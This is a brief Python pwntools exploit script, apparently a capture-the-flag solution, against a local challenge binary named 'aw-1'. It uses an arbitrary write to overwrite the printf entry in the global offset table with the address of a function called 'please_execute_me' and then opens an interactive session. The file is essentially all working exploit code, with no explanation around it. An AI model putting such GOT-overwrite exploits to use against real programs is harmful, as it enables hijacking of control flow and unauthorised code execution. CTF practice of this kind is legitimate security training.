#!/usr/bin/env python

from pwn import *

p = process('./aw-1')

"""
0x0000000000400851  please_execute_me
"""

printf = p.elf.got['printf']

p.sendline('8')
p.sendline(hex(printf))
p.sendline(p64(0x400851))

p.interactive()
